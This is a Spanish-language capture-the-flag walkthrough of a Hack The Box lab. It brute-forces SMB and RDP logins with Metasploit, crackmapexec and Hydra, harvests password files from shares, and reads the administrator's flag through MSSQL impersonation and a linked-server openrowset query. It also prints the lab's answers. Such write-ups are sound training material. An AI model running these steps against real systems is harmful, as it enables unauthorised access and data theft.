
# Lab - Hard

## <mark style="color:purple;">Introducción</mark>

El tercer servidor es otro servidor interno que se utiliza para gestionar archivos y material de trabajo, como formularios. Además, en el servidor se utiliza una base de datos cuya finalidad desconocemos.

***

## <mark style="color:purple;">Pregunta 1</mark>

> #### ¿Qué archivo puedes recuperar que pertenezca al usuario "simon"?

### Escaneo de puertos

```bash
sudo nmap -v -sV -p- 10.129.201.127

PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

Encontramos 3 puertos abiertos, entre ellos el 445 SMB y el 3389 RDP que nos interesan de cara a una enumeración de usuarios y el bruteforce de estos servicios.

También con un escaneo dirigido al puerto 1433 encontramos la base de datos:

```bash
nmap -Pn -sV -sC -p 1433 10.129.158.12

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-07 15:54 CEST
Nmap scan report for inlanefreight.htb (10.129.158.12)
Host is up (0.055s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.158.12:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.158.12:1433: 
|     Target_Name: WIN-HARD
|     NetBIOS_Domain_Name: WIN-HARD
|     NetBIOS_Computer_Name: WIN-HARD
|     DNS_Domain_Name: WIN-HARD
|     DNS_Computer_Name: WIN-HARD
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-05-07T13:54:51+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-05-07T13:50:35
|_Not valid after:  2054-05-07T13:50:35
```

### Bruteforce de SMB

Vamos a usar el módulo smb\_login de Metasploit para hacer el bruteforce contra el usuario Simon:

```
msf6 auxiliary(scanner/smb/smb_login) > run

[*] 10.129.203.10:445     - 10.129.203.10:445 - Starting SMB login bruteforce
[+] 10.129.203.10:445     - 10.129.203.10:445 - Success: '.\simon:liverpool
```

Encontramos las credenciales `simon:liverpool` para acceder por SMB

### Enumeración de SMB

```
crackmapexec smb 10.129.203.10 --shares -u 'simon' -p 'liverpool'

SMB         10.129.203.10   445    WIN-HARD         [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
SMB         10.129.203.10   445    WIN-HARD         [+] WIN-HARD\simon:liverpool 
SMB         10.129.203.10   445    WIN-HARD         [+] Enumerated shares
SMB         10.129.203.10   445    WIN-HARD         Share           Permissions     Remark
SMB         10.129.203.10   445    WIN-HARD         -----           -----------     ------
SMB         10.129.203.10   445    WIN-HARD         ADMIN$                          Remote Admin
SMB         10.129.203.10   445    WIN-HARD         C$                              Default share
SMB         10.129.203.10   445    WIN-HARD         Home            READ            
SMB         10.129.203.10   445    WIN-HARD         IPC$            READ            Remote IPC
```

Con crackmapexec encontramos que podemos acceder al recurso compartido Home

```
smbclient //10.129.203.10/Home 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Apr 21 23:18:21 2022
  ..                                  D        0  Thu Apr 21 23:18:21 2022
  HR                                  D        0  Thu Apr 21 22:04:39 2022
  IT                                  D        0  Thu Apr 21 22:11:44 2022
  OPS                                 D        0  Thu Apr 21 22:05:10 2022
  Projects                            D        0  Thu Apr 21 22:04:48 2022

		7706623 blocks of size 4096. 3163657 blocks available
smb: \>
```

Encontramos 3 usuarios: Fiona, John y Simon

```bash
smb: \> cd IT
smb: \IT\> dir
  .                                   D        0  Thu Apr 21 22:11:44 2022
  ..                                  D        0  Thu Apr 21 22:11:44 2022
  Fiona                               D        0  Thu Apr 21 22:11:53 2022
  John                                D        0  Thu Apr 21 23:15:09 2022
  Simon                               D        0  Thu Apr 21 23:16:07 2022

		7706623 blocks of size 4096. 3167914 blocks available
smb: \IT\> cd Simon
smb: \IT\Simon\> dir
  .                                   D        0  Thu Apr 21 23:16:07 2022
  ..                                  D        0  Thu Apr 21 23:16:07 2022
  random.txt                          A       94  Thu Apr 21 23:16:48 2022

		7706623 blocks of size 4096. 3167914 blocks available
smb: \IT\Simon\> get random.txt
getting file \IT\Simon\random.txt of size 94 as random.txt (0,5 KiloBytes/sec) (average 0,5 KiloBytes/sec)
```

Bingo! Hemos encontrado el archivo objetivo, nos lo podemos descargar con `get`.

***

## <mark style="color:purple;">Pregunta 2</mark>

> #### Enumera el objetivo y busque una contraseña para el usuario Fiona. ¿Cuál es su contraseña?

Accedemos a la carpeta de Fiona que encontramos por SMB y vemos que hay un archivo de credenciales: `creds.txt`

```bash
smb: \> cd IT/Fiona
smb: \IT\Fiona\> dir
  .                                   D        0  Thu Apr 21 22:11:53 2022
  ..                                  D        0  Thu Apr 21 22:11:53 2022
  creds.txt                           A      118  Thu Apr 21 22:13:11 2022

		7706623 blocks of size 4096. 3167898 blocks available
		
smb: \IT\Fiona\> get creds.txt
getting file \IT\Fiona\creds.txt of size 118 as creds.txt (0,5 KiloBytes/sec) (average 0,5 KiloBytes/sec)
```

Con este archivo podríamos probar a hacer bruteforce contra SMB o RDP y el usuario Fiona.

```bash
cat creds.txt                                                    
───────┬──────────────────────────────────────────────────────────────────────────────────────────────
       │ File: creds.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Windows Creds
   2   │ 
   3   │ kAkd03SA@#!
   4   │ 48Ns72!bns74@S84NNNSl
   5   │ SecurePassword!
   6   │ Password123!
   7   │ SecureLocationforPasswordsd123!!
```

### Bruteforce de SMB

```
crackmapexec smb 10.129.225.141 -u fiona -p creds.txt --local-auth

SMB         10.129.225.141  445    WIN-HARD         [*] Windows 10.0 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
SMB         10.129.225.141  445    WIN-HARD         [-] WIN-HARD\fiona:kAkd03SA@#! STATUS_LOGON_FAILURE 
SMB         10.129.225.141  445    WIN-HARD         [+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl 
```

Bingo! Obtenemos la contraseña de FIona: `48Ns72!bns74@S84NNNSl`

Con estas credenciales, vamos a enumerar los recursos compartidos

### Enumeración de SMB

```
crackmapexec smb 10.129.225.141 -u 'fiona' -p '48Ns72!bns74@S84NNNSl' --shares

SMB         10.129.225.141  445    WIN-HARD         [*] Windows 10.0 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
SMB         10.129.225.141  445    WIN-HARD         [+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl 
SMB         10.129.225.141  445    WIN-HARD         [+] Enumerated shares
SMB         10.129.225.141  445    WIN-HARD         Share           Permissions     Remark
SMB         10.129.225.141  445    WIN-HARD         -----           -----------     ------
SMB         10.129.225.141  445    WIN-HARD         ADMIN$                          Remote Admin
SMB         10.129.225.141  445    WIN-HARD         C$                              Default share
SMB         10.129.225.141  445    WIN-HARD         Home            READ            
SMB         10.129.225.141  445    WIN-HARD         IPC$            READ            Remote IPC
```

Igual que el usuario Simon, tenemos el recurso compartido Home accesible.

```
smbclient -U fiona //10.129.225.141/Home
Password for [WORKGROUP\fiona]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Apr 21 23:18:21 2022
  ..                                  D        0  Thu Apr 21 23:18:21 2022
  HR                                  D        0  Thu Apr 21 22:04:39 2022
  IT                                  D        0  Thu Apr 21 22:11:44 2022
  OPS                                 D        0  Thu Apr 21 22:05:10 2022
  Projects                            D        0  Thu Apr 21 22:04:48 2022

		7706623 blocks of size 4096. 3167830 blocks available
smb: \> cd IT
```

```
smb: \IT\> dir
  .                                   D        0  Thu Apr 21 22:11:44 2022
  ..                                  D        0  Thu Apr 21 22:11:44 2022
  Fiona                               D        0  Thu Apr 21 22:11:53 2022
  John                                D        0  Thu Apr 21 23:15:09 2022
  Simon  
  
smb: \IT\> cd John
ls
smb: \IT\John\> ls
  .                                   D        0  Thu Apr 21 23:15:09 2022
  ..                                  D        0  Thu Apr 21 23:15:09 2022
  information.txt                     A      101  Thu Apr 21 23:14:58 2022
  notes.txt                           A      164  Thu Apr 21 23:13:40 2022
  secrets.txt                         A       99  Thu Apr 21 23:15:55 2022

		7706623 blocks of size 4096. 3167830 blocks available
smb: \IT\John\> 
```

Hay 3 archivos que parecen importantes dentro de este usuario `John`, 2 de ellos con información relevante:

```shell-session
afsh4ck@kali$ cat information.txt

To do:
- Keep testing with the database.
- Create a local linked server.
- Simulate Impersonation.
```

```shell-session
afsh4ck@kali$ cat secrets.txt

Password Lists:

1234567
(DK02ka-dsaldS
Inlanefreight2022
Inlanefreight2022!
TestingDB123
```

### Bruteforce de RDP

Vamos a hacer bruteforce a RDP para poder acceder al sistema de forma gráfica:

```
hydra -l fiona -P creds.txt 10.129.158.12 rdp

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-07 17:01:09
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 5 login tries (l:1/p:5), ~2 tries per task
[DATA] attacking rdp://10.129.158.12:3389/
[3389][rdp] host: 10.129.158.12   login: fiona   password: 48Ns72!bns74@S84NNNSl
```

Obtenemos la contraseña RDP de Fiona, que es la misma del servicio SMB: `48Ns72!bns74@S84NNNSl`

### Conexión por RDP

```
xfreerdp /v:10.129.158.12 /u:fiona /p:'48Ns72!bns74@S84NNNSl'
```

<figure><img src="/files/azoj41Q1EBVZAk9mjmDQ" alt=""><figcaption></figcaption></figure>

Mimikatz no consigue extraer hashes, ya que necesitamos más privilegios, pero encontramos que podemos acceder al SQL Server:

<figure><img src="/files/V2SmcsavghusQlmRZ4yq" alt=""><figcaption></figcaption></figure>

Probamos con todas las posibles combinaciones de John pero no podemos acceder, por lo que vamos a probar a entrar a la base de datos de otra manera: con `sqlcmd`

***

## <mark style="color:purple;">Pregunta 3</mark>

#### Envíe el contenido del archivo flag.txt en el escritorio del administrador.

### Acceso a base de datos

Una vez que hemos accedido por RDP, abrimos un cmd o powershell y ejecutamos lo siguiente:

```sql
PS C:\Users\Fiona> sqlcmd
1> select name from master.dbo.sysdatabases
2> ;
3> go
name                                                                                                        
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                      
tempdb                                                                                                      
model                                                                                                       
msdb                                                                                                        
TestingDB                                                                                                   
TestAppDB                                                                                                   

(6 rows affected)
1>
```

```sql
1> use master
2> go
Changed database context to 'master'.
1> show tables
2> go
Msg 2812, Level 16, State 62, Server WIN-HARD\SQLEXPRESS, Line 1
Could not find stored procedure 'show'.
1> select table_name from master.information_schema.tables
2> go
table_name                                                                                                  
--------------------------------------------------------------------------------------------------------------------------------
spt_fallback_db                                                                                             
spt_fallback_dev                                                                                            
spt_fallback_usg                                                                                            
spt_values                                                                                                  
spt_monitor                                                                                                 

(5 rows affected)
1>
```

Enumeramos las bases de datos pero no encontramos nada relevante, por lo que vamos a probar a autenticarnos como el usuario administrador

### Impersonation

Vamos a impersonarnos como el usuario john de la siguiente manera:

```sql
1> execute as login = 'john'
2> select system_user
3> select is_srvrolemember('sysadmin')
4> go
                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
john                                                                                                        

(1 rows affected)

-----------
          0

(1 rows affected)
1>
```

Nos conseguimos autenticar como el usuario john

### Identificación de servidores vinculados MSSQL

```sql
1> select srvname, isremote from sysservers
2> go
srvname                                                                                                                          isremote
-------------------------------------------------------------------------------------------------------------------------------- --------
WINSRV02\SQLEXPRESS                                                                                                                     1
LOCAL.TEST.LINKED.SRV                                                                                                                   0

(2 rows affected)
1>
```

Encontramos un servidor vinculado a MSSQL: `LOCAL.TEST.LINKED.SRV`&#x20;

### Enumeración del servidor vinculado MSSQL

```sql
1> execute('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [local.test.linked.srv]
2> go
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
-------------------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ -------------------------------------------------------------------------------------------------------------------------------- -----------
WINSRV02\SQLEXPRESS                                                                                                              Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
                                                                                     testadmin                                                                                                                                  1

(1 rows affected)
1>
```

### Extracción de la flag

El siguiente comando es un poco "tricky", ya que tenemos que hacer un execute del select que hace un bulk del archivo que queremos leer, y le tenemos que asignar el servidor vinculado MSSQL al final:

```sql
1> 1> execute('select * from openrowset(bulk ''C:/Users/Administrator/desktop/flag.txt'', single_clob) as contents') at [local.test.linked.srv];
2> go
BulkColumn                                                                                                                                                                                                                
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
HTB{46u$!n9_l!nk3d_$3rv3r$}                                                                                                                                                                                               

(1 rows affected)
1>
```

Y buumm! Conseguimos acceder al archivo que queramos correctamente, en este caso la flag!
